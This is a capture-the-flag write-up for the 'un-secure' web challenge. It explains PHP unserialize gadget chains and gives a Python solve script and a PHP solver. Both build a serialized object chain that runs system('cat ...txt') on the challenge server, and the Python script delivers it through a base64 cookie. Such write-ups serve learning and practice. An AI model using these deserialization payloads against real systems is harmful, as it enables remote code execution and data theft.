# un-secure

Do you know what "unserialize" means? In PHP, unserialize is something that can be very dangerous, you know? 
It can cause Remote Code Execution. 
And if it's combined with an autoloader like in Composer, it can use gadgets in the autoloaded folder to achieve Remote Code Execution.

## Solution

Had trouble in my attempt trying to serialize `\xde\xad\xbe\xef`

```py
# https://github.com/SuperStormer/writeups/blob/master/tcp1pctf_2023/web/unsecure/solve.py

from base64 import b64encode

import requests
from phpserialize import serialize  # this is https://pypi.org/project/libphpserialize/, not the other one
from phpserialize.decorators import namespace

@namespace("GadgetThree")
class Vuln:
	public_waf1 = 1
	protected_waf2 = "\xde\xad\xbe\xef"
	private_waf3 = False
	public_cmd = f"system('cat *.txt');"

@namespace("GadgetOne")
class Adders:
	private_x = Vuln()

@namespace("GadgetTwo")
class Echoers:
	protected_klass = Adders()

exploit = serialize(Echoers())
print(
	requests.get(
	"http://ctf.tcp1p.com:45678/",
	cookies={
	"cookie":
	# do some shenanigans to make waf2 actually be "\xde\xad\xbe\xef"
	b64encode(exploit.encode("latin-1").replace(b"s:8:\"\xde", b"s:4:\"\xde")).decode()
	}
	).text
)
```

Another solver from discord:

```php
<?php

include 'GadgetOne/Adders.php';
include 'GadgetTwo/Echoers.php';
include 'GadgetThree/Vuln.php';

use GadgetOne\Adders;
use GadgetTwo\Echoers;
use GadgetThree\Vuln;

/* Gadget Three */
$vuln = new Vuln();

$vuln->waf1 = 1;

$reflection2 = new \ReflectionProperty(get_class($vuln), 'waf2');
$reflection2->setAccessible(true);
$reflection2->setValue($vuln, "\xde\xad\xbe\xef");

# $vuln->cmd = "system('ls -alh');";
$vuln->cmd = "system('cat 182939124819238912571292389218129123.txt');echo '\n';";

/* Gadget One */
$adder=new Adders($vuln);

/* Gadget Two */
$echoers = new Echoers();

$reflection3 = new \ReflectionProperty(get_class($echoers), 'klass');
$reflection3->setAccessible(true);
$reflection3->setValue($echoers, $adder);

$serialized = serialize($echoers);

echo base64_encode($serialized);
echo "\n\n";
```
